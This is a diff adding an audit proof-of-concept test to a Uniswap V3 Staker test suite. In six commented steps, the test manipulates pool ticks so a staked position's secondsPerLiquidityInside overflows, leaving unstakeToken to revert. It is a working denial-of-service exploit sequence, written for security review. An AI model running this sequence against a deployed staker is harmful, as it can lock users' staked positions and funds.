@@ -500,4 +500,106 @@ contract UniswapV3StakerTest is DSTestPlus, IERC721Receiver {
 
         assertEq(rewardToken.balanceOf(address(baseV2Minter)), 1 ether / 2);
     }
+
+    struct SwapCallbackData {
+        bool zeroForOne;
+    }
+
+    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes calldata _data) external {
+        require(msg.sender == address(pool), "FP");
+        require(amount0 > 0 || amount1 > 0, "LEZ"); // swaps entirely within 0-liquidity regions are not supported
+        SwapCallbackData memory data = abi.decode(_data, (SwapCallbackData));
+        bool zeroForOne = data.zeroForOne;
+
+        if (zeroForOne) {
+            token0.mint(address(this), uint256(amount0));
+            token0.transfer(msg.sender, uint256(amount0));
+        } else {
+            token1.mint(address(this), uint256(amount1));
+            token1.transfer(msg.sender, uint256(amount1));
+        }
+    }
+
+    // Test minting a position and transferring it to Uniswap V3 Staker, after creating a gauge
+    function testAudit1() public {
+        // Create a Uniswap V3 pool
+        (pool, poolContract) =
+            UniswapV3Assistant.createPool(uniswapV3Factory, address(token0), address(token1), poolFee);
+
+        // Initialize 1:1 0.3% fee pool
+        UniswapV3Assistant.initializeBalanced(poolContract);
+        hevm.warp(block.timestamp + 100);
+
+        // 3338502497096994491500 to give 1 ether per token with 0.3% fee and -60,60 ticks
+        newNFT(-180, 180, 3338502497096994491500);
+        newNFT(-60, 60, 3338502497096994491500);
+
+        hevm.warp(block.timestamp + 100);
+
+        // @audit Step 1: Swap to make currentTick go to (60, 180) range
+        uint256 amountSpecified = 30 ether;
+        bool zeroForOne = false;
+        pool.swap(
+            address(this),
+            zeroForOne,
+            int256(amountSpecified),
+            1461446703485210103287273052203988822378723970342 - 1, // MAX_SQRT_RATIO - 1
+            abi.encode(SwapCallbackData({zeroForOne: zeroForOne}))
+        );
+        (, int24 _currentTick,,,,,) = pool.slot0();
+        console2.logInt(int256(_currentTick));
+
+        hevm.warp(block.timestamp + 100);
+
+        // @audit Step 2: Swap back to make currentTick go back to (-60, 60) range
+        zeroForOne = true;
+        pool.swap(
+            address(this),
+            zeroForOne,
+            int256(amountSpecified),
+            4295128739 + 1, // MIN_SQRT_RATIO + 1
+            abi.encode(SwapCallbackData({zeroForOne: zeroForOne}))
+        );
+
+        (, _currentTick,,,,,) = pool.slot0();
+        console2.logInt(int256(_currentTick));
+
+        hevm.warp(block.timestamp + 100);
+
+        // @audit Step 3: Create normal Incentive
+        uint256 minWidth = 10;
+        // Create a gauge
+        gauge = createGaugeAndAddToGaugeBoost(pool, minWidth);
+        // Create a Uniswap V3 Staker incentive
+        key = IUniswapV3Staker.IncentiveKey({pool: pool, startTime: IncentiveTime.computeEnd(block.timestamp)});
+
+        uint256 rewardAmount = 1000 ether;
+        rewardToken.mint(address(this), rewardAmount);
+        rewardToken.approve(address(uniswapV3Staker), rewardAmount);
+
+        createIncentive(key, rewardAmount);
+
+        // @audit Step 4: Now we have secondsPerLiquidity of tick 60 is not equal to 0.
+        //        We just need to create a position with range [-120, 60],
+        //        then secondsPerLiquidityInside of this position will be overflow
+        hevm.warp(key.startTime + 1);
+        int24 tickLower = -120;
+        int24 tickUpper = 60;
+        uint256 tokenId = newNFT(tickLower, tickUpper, 3338502497096994491500);
+        (, uint160 secondsPerLiquidityInsideX128,) = pool.snapshotCumulativesInside(tickLower, tickUpper);
+        console2.logUint(uint256(secondsPerLiquidityInsideX128));
+
+        // @audit Step 5: Stake the position
+        // Transfer and stake the position in Uniswap V3 Staker
+        nonfungiblePositionManager.safeTransferFrom(address(this), address(uniswapV3Staker), tokenId);
+
+        // @audit Step 6: Increase time to make `secondsPerLiquidity` go from negative to positive value
+        //        Then `unstakeToken` will revert
+        hevm.warp(block.timestamp + 5 weeks);
+
+        (, secondsPerLiquidityInsideX128,) = pool.snapshotCumulativesInside(tickLower, tickUpper);
+        console2.logUint(uint256(secondsPerLiquidityInsideX128));
+
+        uniswapV3Staker.unstakeToken(tokenId);
+    }
 }
